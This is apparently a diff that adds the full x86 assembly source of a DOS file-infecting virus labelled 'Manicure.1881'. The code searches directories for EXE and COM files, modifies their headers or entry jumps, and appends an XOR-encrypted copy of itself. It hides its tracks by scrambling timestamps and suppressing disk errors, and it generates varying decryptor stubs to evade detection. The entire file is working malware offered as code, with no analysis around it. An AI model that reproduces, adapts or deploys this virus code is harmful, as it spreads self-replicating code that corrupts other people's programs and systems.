@@ -1,0 +1,725 @@
+;
+;
+;Name: Manicure.1881
+;Target: DOS COM/EXE and COMMAND.COM
+;Encrypt: Yes
+;Resident: No
+;Stealth: Yes
+;Polymorphic: Yes, (Lower Level) change key and decryptor
+;Anti-Heuristic: No
+
+False  =  1
+True   =  0
+
+Debug  =  True
+
+code    segment
+        assume cs:code,ds:code,es:code
+        Org 100h
+Start:                  
+        db 0e9h
+        dw encrypt_part-Start-3 
+        db 'S'
+
+begin_virus:        
+        mov Cx,end_crypt_part-encrypt_part
+        db 0beh           ;mov si,?
+direct: dw ?                     
+        call crypt
+
+encrypt_part:
+        Call _delta_0ffset      ;delta_offset routine ;)
+fake_delta_offset:
+        Db 0eah
+        Dw Offset restore_dta
+_delta_0ffset:
+        Pop Bp
+        mov bx,bp
+        Sub Bp,Offset fake_delta_offset  
+
+        Push Cs           ;
+        Pop Ds            ;ds=cs
+     
+        Mov Word Ptr [_es+bp],es         ;save current es     
+
+        Push [bp+offset COMEXE]
+
+        Cmp Byte Ptr [bp+COMEXE],1
+        Jne COM_lead
+      
+        Push Cs           
+        Pop Es            ;es=cs
+
+        Lea Si,store+bp   ;prepare for host 
+        Lea Di,old+bp     ;execution 
+        Mov Cx,4
+        Rep Movsw
+        Jmp move_dta
+
+COM_lead:                 ;restore the host
+        Lea Si,buffer+bp  ;where to take the 4 bytes
+        Mov Di,103h       ;where to put them
+        Sub di,3
+        Mov Cx,2
+        Rep Movsw
+
+move_dta:
+
+        call    get_current_dir       
+
+        push    es
+        mov     ax,3521h
+        int     21h
+        mov     [bp+offset int21],bx
+        mov     [bp+offset int21+2],es
+        pop     es
+
+        Mov Ah,1ah
+        Lea Dx,new_dta+bp
+        Int 21h
+
+Error_Handle:
+        Push ds    
+        Pop  es
+        Mov  ax,3524h                       
+        Int  21h                            
+        Mov  word ptr [bp+old_int24h],bx    
+        Mov  word ptr [bp+old_int24h+2],es  
+
+        Mov ah,25h                         
+        Lea dx,bp+int_24h           
+        Int 21h
+        Push cs
+        Pop es                             
+
+        Push ds es
+
+        Mov  ax,3521h               ; get int 21h handler
+        Int  21h
+        Push es
+        Pop  ds
+        Xchg bx,dx
+        Mov  ax,2503h               ; set int 3 = int 21h handler
+        Int  21h
+        Pop  es ds
+
+Infxdir:
+        Mov  ah,4eh
+        Lea  dx,exe_file+bp
+        Mov  cx,7
+        jnc  dead_dos
+        dw   0eah
+        dw   offset int21
+dead_dos:       
+        call int21h
+        Jc   Error_exe
+        Call open_file
+
+        Mov ah,4eh
+        Lea dx,comm_dos+bp
+        Mov cx,7
+        call int21h
+
+        Jc Error_exe        
+        Call open_file        
+Error_exe: 
+        Jmp COM_the_leader
+;------------------------------------------------;
+; Main Part Of EXE infector                      ;
+;------------------------------------------------;    
+open_file:
+        Mov byte ptr [bp+COMEXE],1
+
+        Xor cx,cx
+        Lea dx,[bp+new_dta+1Eh]
+        Mov ax,4301h                ; set attributes to nothing
+        call int21h
+
+        Mov ax,3d02h      ;open file found
+        Lea dx,new_dta+1eh+bp 
+        call  int21h
+     
+        Xchg ax,bx        ;put file handler into bx
+    if  debug
+        Mov ax,5700h
+        Int 21h         
+        Mov word ptr [bp+new_dta+16h],cx
+        Mov word ptr [bp+new_dta+18h],dx
+    
+        Call set_date
+    endif
+read_file:            
+        Mov ah,3fh        ;read the header of 
+        Mov cx,1ch        ;file found
+        Lea dx,exe_header+bp
+        call  int21h
+
+@check: Cmp byte ptr [exe_header+bp],'M'
+        Jne _check2
+        Cmp byte ptr [exe_header+1+bp],'Z'
+        Je  test3
+_check2:Cmp word ptr [exe_header+bp],'MZ'
+        Jne close_anyway 
+test3:  Cmp word ptr [exe_header+12h+bp],'FK'
+        Je  close_anyway                 
+test4:  Cmp word ptr [exe_header+26+bp],0
+        Jne close_anyway
+test5:  Cmp byte ptr [exe_header+24+bp],'@'
+        Je  close_anyway
+
+save_exe_header:
+        call  save_reg
+
+go_end:
+        mov  ah,42h
+        call @down
+
+        Push ax dx
+
+compute_new_csip:
+        Push ax
+        Mov ax,word ptr [exe_header+bp+8]                        
+        Mov cl,4
+        Shl ax,cl
+        Mov cx,ax
+        Pop ax
+        Sub ax,cx
+        Sbb dx,0
+        Mov cl,0ch
+        Shl dx,cl
+        Mov cl,4
+        Push ax
+        Shr ax,cl
+        Add dx,ax
+        Shl ax,cl
+        Pop cx
+        Sub cx,ax
+        Jmp change_exe_header
+close_anyway:
+        Jmp get_another2
+change_exe_header:
+        Mov word ptr [exe_header+bp+14h],cx
+        Mov word ptr [exe_header+bp+16h],dx
+        Mov word ptr [exe_header+bp+0eh],dx
+        Mov word ptr [exe_header+bp+10h],0a00h
+        Mov word ptr [exe_header+bp+0ah],00a0h
+        Mov word ptr [exe_header+bp+12h],'FK'
+
+        Add cx,offset encrypt_part-offset begin_virus
+        Mov word ptr [direct+bp],cx
+        Pop dx ax
+compute_size:
+        Add ax,end_virus-begin_virus
+        Adc dx,0
+        Mov cx,512      ; 512 = 200h
+        Div cx
+        Cmp dx,0
+        Je enough
+        Inc ax
+enough:
+        Mov word ptr [exe_header+bp+04],ax
+        Mov word ptr [exe_header+bp+02],dx
+        Call Load_key
+write_virus:
+        Lea Si,begin_virus+bp
+        Lea Di,heap+bp
+        Mov Cx,end_virus-begin_virus
+        Rep Movsb
+                   
+        lea si,(encrypt_part-begin_virus)+heap+bp
+        mov cx,end_crypt_part-encrypt_part
+encrypt_exe:
+        call crypt
+                    
+       mov Cx,end_virus-begin_virus
+       mov Ah,40h
+       lea Dx,bp+heap
+       call int21h
+
+       mov   ah,42h
+       call  @top        
+
+copy_new_header:   
+        mov Cx,1ch
+        mov Ah,40h
+        lea Dx,exe_header+bp
+        call int21h
+          
+                
+get_another2:    
+   if  debug
+       Mov ax,5700h
+       Mov cx,offset [bp+new_dta+16h]
+       Mov dx,offset [bp+new_dta+18h]
+       Inc al
+       Int 21h      
+   else
+       Call set_date
+   endif
+       Mov ah,3eh
+       call  int21h
+
+       Xor cx,cx
+       Mov ax,4301h
+       Mov cl,byte ptr [bp+new_dta+15h]  ; cl = attributes
+       Lea dx,[bp+new_dta+1Eh]
+       Int 3h
+ 
+       Mov ah,4fh
+       Int 21h      
+
+        Jnc open_file2
+        Retn
+
+open_file2:
+        jmp open_file
+
+COM_the_leader:
+        or      bp,bp
+        jz      next_   
+
+        cld
+
+next_:  mov ah,4eh
+        mov cx,7
+        lea dx,com_mask+bp
+        call int21h
+        jnc open_file1
+        jmp restore_dta
+
+open_file1:
+        mov byte ptr [bp+COMEXE],0
+;------ Check for COMMAND.COM ver 1 ------;
+verify:
+        mov cx,13d                     ;max size of file name
+        lea si,[new_dta+bp]            ;9eh = new_dta
+compare:
+        lodsb                          ;find the point!
+        cmp al,"."                     ;is it?
+        jne compare                    ;no? try again
+        inc si                         ;yes? next letter
+        cmp word ptr [si], "MO"        ;does it spell .COM?
+        je  check_for_command_com      ;no find next!
+        jmp next_file1
+check_for_command_com:
+        cmp word ptr [bp+new_dta+32],'MM' ;is it command.com?
+        je  next_file1                 ;yes? next!
+
+;-------- Old Trick to Check for COMMAND.COM ---------;
+;   cmp  word ptr [bp+new_dta+35],'DN' ; Check for commaND.com
+;   je   next_file1
+;   cmp  word ptr [bp+new_dta+33],'AM'  ;Check for comMAnd.COM
+;   je   next_file1
+;   cmp  word ptr [bp+new_dta+32],'MM'  ;ChECk FOr CoMMaND.COm
+;   je   next_file1
+;   cmp  word ptr [bp+new_dta+31],'MO'
+;   je   next_file1
+;----------------------------------------------
+        cmp byte ptr [bp+new_dta+31],'0'   ; check for number file
+        je  next_file1                     ; leave it alone
+        cmp byte ptr [bp+new_dta+35],'9'
+        je  next_file1
+
+        xor cx,cx
+        lea dx,[bp+new_dta+1Eh]
+        mov ax,4301h                ; set attributes to nothing
+        int 3h
+
+        mov ax,3d02h
+        lea dx,new_dta+bp+1eh
+        int 3h     
+        
+        xchg ax,bx        ;put handle of found file in bx
+
+save_time:
+   if   debug
+        mov ax,5700h
+        int 21h     
+        mov word ptr [bp+new_dta+16h],cx    
+        mov word ptr [bp+new_dta+18h],dx
+   
+        call set_date        
+   endif
+read_file1:
+        mov ah,3fh        ;read 4 first bytes of file in   
+        mov cx,4          ;buffer
+        lea dx,buffer+bp
+        call  int21h
+          
+next_test:
+        cmp word ptr [buffer+bp],'MZ'   ;it s a real
+        je next_file1                   
+        cmp word ptr [buffer+bp],'ZM'   ;com_file?
+        je next_file1
+        cmp byte ptr [buffer+bp+3],'S'  ;infected?
+        je next_file1
+        jmp go_end1
+next_file1:          
+        jmp next_file
+go_end1:
+        db 0b8h           ;mov ax,?
+go_down: dw 4202h         
+        xor cx,cx         ;you get ax filled 
+        cwd               ;with the size of
+        int 21h            ;file 
+        push ax           ;save ax for later  
+
+        add ax,encrypt_part-begin_virus+100h    ;compute address of
+        mov word ptr [direct+bp],ax            ;beginning of crypt_part
+                                              ;in the file to infect         
+        pop ax            ;restore ax   
+
+        sub ax,3
+        mov word ptr [_4_bytes+bp+1],ax
+        call Load_key                  
+       
+        lea si,begin_virus+bp
+        lea di,heap+bp
+        mov cx,end_virus-begin_virus
+        rep movsb   
+
+        lea si,(encrypt_part-begin_virus)+heap+bp
+        mov cx,end_crypt_part-encrypt_part
+encrypt_com:
+        call crypt
+        mov word ptr [write1+bp],40b4h  
+write_virus1:
+write1: Db  09eh,$-go_begin
+        lea dx,heap+bp
+        mov cx,end_virus-begin_virus
+        call int21h
+       
+go_begin:
+        mov  ah,42h
+        call @top
+      
+        Mov Ah,40h
+        Lea Dx,_4_bytes+bp 
+        Mov Cx,04h 
+        call int21h
+
+set_time:
+   If   debug
+        mov ax,5701h
+        mov cx,offset [bp+new_dta+16h]
+        mov dx,offset [bp+new_dta+18h]
+        int 21h     
+   Else
+        call set_date
+   Endif       
+        mov ax,5701h
+        int 21h
+        Org $-2             ; delete 2 line above
+                            ; and Org $-1 erase i line below
+
+        mov ah,3eh
+        int 21h     
+
+       xor cx,cx
+       mov ax,4301h
+       mov cl,byte ptr [bp+new_dta+15h]  ; cl = attributes
+       lea dx,[bp+new_dta+1Eh]
+       int 3h
+       
+next_file:
+        mov     ah,4fh
+        int     21h   
+
+        jc      _find_dot
+        jmp     open_file1
+@@find_all:
+        jmp     Infxdir
+
+change_dir1:
+
+_find_dot:
+        call    change_to_dotdot
+        jnc     @@find_all
+        
+restore_dta:
+        call    set_current_dir
+
+        push    es                      
+        pop     ds
+        mov     ax,2524h             
+        lds     dx,bp+old_int24h
+        int     3h 
+        push    cs
+        pop     ds
+
+       pop      [bp+offset COMEXE]
+
+       cmp      byte ptr [bp+COMEXE],1
+       jne      COMOUT
+
+       mov      ax,word ptr [_es+bp]
+
+       push     ax
+       pop      ds
+
+       mov      dx,80h
+       mov      ah,1ah
+       int      21h      
+
+       push ds
+       pop  es
+
+       mov ax,es 
+       add ax,10h
+       add word ptr cs:[old_cs+bp],ax
+       cli 
+       add ax,word ptr cs:[bp+old_ss]
+       mov ss,ax
+       mov sp,word ptr cs:[bp+old_sp]
+       sti
+       db 0eah
+old:
+       old_ip dw 0
+       old_cs dw 0
+       old_sp dw 0
+       old_ss dw 0
+store:
+       store_ip dw 0
+       store_cs dw 0fff0h
+       store_sp dw 0
+       store_ss dw 0fff0h
+COMOUT:
+        mov ah,1ah
+        mov dx,80h
+        int 21h     
+return_host:
+        xor ax,ax
+        xor cx,cx
+        cwd
+        xor bp,bp
+        xor si,si
+        xor di,di
+        mov bx,100h
+        push bx
+        xor bx,bx
+        ret
+set_date:                  
+            in      ax,40h  ; calculate the year
+            and     ax,0fh
+            xchg    dx,ax
+            shl     dx,9
+get_month:                  ;calculates the Month
+            in      ax,40h
+            and     ax,0fh
+            cmp     ax,0ch
+            ja      get_month
+            or      ax,ax
+            jz      get_month
+            shl     ax,5
+            or      dx,ax
+get_date:                   ;calculates the Day
+            in      ax,40h
+            and     ax,1fh
+            or      ax,ax
+            jz      get_date
+            or      dx,ax           ;DX = DATE
+get_secs:                   ;calculates seconds
+            in      ax,40h
+            and     ax,1fh
+            cmp     ax,1dh
+            ja      get_secs
+            xchg    cx,ax
+get_minuits:                ;calculates minutes
+            in      ax,40h
+            and     ax,3fh
+            cmp     ax,3bh
+            ja      get_minuits
+            shl     ax,5
+            or      cx,ax
+get_hours:                  ;calculates hours 
+            in      ax,40h
+            and     ax,1fh
+            cmp     ax,17
+            ja      get_hours
+            shl     ax,0bh
+            or      cx,ax           ;CX = TIME
+            mov     ax,5701h        ;set DATE/TIME stamp
+            int     3h
+            ret
+int_24h:
+        mov al,3
+        iret
+
+;-------- Random Key Begin -----------;
+Load_key:
+        push bx
+        Mov Ah,0FFh
+        Call rand_num
+        Or  al,al
+        Jz  inc_al
+        Inc al
+        Mov byte ptr [_load_key+bp],al
+        call Add_Decryptor
+        pop bx
+        Ret
+inc_al: Inc al
+        ret
+rand_num:
+        In  al,40h
+        And al,ah
+        Sub ah,ah
+        Ret
+;----- End Random Key -----;
+Add_Decryptor:               ; Generate Random
+        Mov  Ah,5
+        Call rand_num
+        Or   Al,Al
+        Jz   Add_Decryptor
+        Cmp  Al,1
+        Je   junk1
+        Cmp  Al,2
+        Je   junk3
+        Cmp  Al,3
+        Je   junk4
+        Cmp  al,4
+        Je   junk2        
+        Ret      
+;-------pick random decryptor----------;
+junk1:  Lea Di,crypt1+Bp       ;Generate Decryptor/Encryptor
+        Call add_junk_code2
+        Ret
+junk2:  Lea Di,crypt1+Bp       ;Generate Decryptor/Encryptor
+        Call add_junk_code4
+        Ret
+junk3:  Lea Di,crypt1+Bp       ;Generate Decryptor/Encryptor
+        Call add_junk_code2
+        Ret
+junk4:  Lea Di,crypt1+Bp
+        Call add_junk_code5
+        Ret
+add_junk_code2:
+        mov ax,0F787h       ; xchg si,di
+        stosw
+        mov al,2eh          ; cs:
+        stosb
+        mov ax,0530h        ; xor cs:[di],al
+        stosw
+        mov  ax,0F787h      ; xchg si,di
+        stosw
+        mov al,046h         ; inc si
+        stosb
+        ret
+add_junk_code4:
+        mov ax,0F387h       ; xchg si,bx
+        stosw
+        mov al,2eh          ; cs:
+        stosb
+        mov ax,0730h        ; xor cs:[bx],al
+        stosw
+        mov al,43h          ; inc bx
+        stosb
+        mov ax,0F387h       ; xchg si,bx
+        stosw
+        ret
+Add_junk_code5:
+        mov ax,0F787h      ; xchg si,di
+        stosw
+        mov al,2Eh         ; cs:
+        stosb
+        mov ax,0530h       ; xor [di],al
+        stosw
+        mov al,47h         ; inc di
+        stosb
+        mov ax,0F787h      ; xchg si,di
+        stosw     
+        ret
+;-- End Basic Understanding Polymorphic Simple Engine --;
+save_reg:
+        Mov ax,word ptr [exe_header+bp+0eh]
+        xchg ax,Word Ptr [store_ss+bp]
+        Mov ax,word ptr cs:[exe_header+bp+10h]
+        xchg ax,Word Ptr [store_sp+bp]
+        Mov ax,word ptr [exe_header+bp+14h]
+        xchg ax,Word Ptr [store_ip+bp]
+        Mov ax,word ptr cs:[exe_header+bp+16h]
+        xchg ax,Word Ptr [store_cs+bp]
+        ret
+
+int21h:    pushf                      ;this simulates an int
+           push    cs                 ;by pushing all flags and CS register
+           call    intdos             ;and pushing IP
+           ret                        ;return to caller
+intdos:    db      0eah               ;this jumps to int 21h handler
+int21      db      00,00,00,00        ;CS:IP of int 21h handler
+
+get_current_dir:
+        mov  ah,47h                
+        cwd                        
+        lea  si,[bp+Cur_DIR]       
+        int  21h                   
+        ret
+
+set_current_dir:
+         mov ah,3bh           
+         lea dx,[bp+Cur_DIR]  
+         int 21h
+         ret
+
+change_to_dotdot:             ;this is the dot dot routine
+        lea dx,[bp+dotdot]    ;load dotdot from datasegment
+        mov ah, 3bh           ;int for "chdir" set current directory
+        int 21h               ;do it!
+        ret 
+dotdot            db  '..',0
+
+@top: sub al,al
+      jmp @next_cx
+@down:
+      inc al
+      inc al
+@next_cx:
+      cwd
+      sub cx,cx
+      call  int21h
+      ret
+      
+;--- Data ---;
+ Cur_DIR         db      64 dup (0)
+ COMEXE          db      0                         
+ exe_file        db      '*.e?e',0   
+ com_mask        db      '*.c?m',0   
+ comm_dos        db      'c?mm???.c?m',0
+ _4_bytes        db      0e9h,0,0,'S'
+ buffer          db      0cdh,20h,90h,90h
+          
+end_crypt_part:
+If    Debug
+crypt:      db 0b4h
+_load_key  =  byte ptr $-1
+crypt1:     xchg si,di
+            Stc
+            xor byte ptr es:[di],ah
+            Cld
+            inc di
+            Cwd
+            xchg si,di
+            Nop
+crypt_loop: loop crypt
+            ret
+Else
+crypt:      Db 0b0h
+_load_key:  Db ? 
+crypt1:     xchg si,bx
+            xor byte ptr cs:[bx],al
+            xchg si,bx
+            inc si
+            dec cx
+            or cx,cx
+crypt_loop: jnz  crypt
+            ret
+EndIf
+end_virus:
+       old_int24h  dd   ?
+        _es        dw   ? 
+        exe_header db   1ch dup (?)
+        new_dta    db   43  dup (?)
+
+heap:
+
+code ends
+end Start
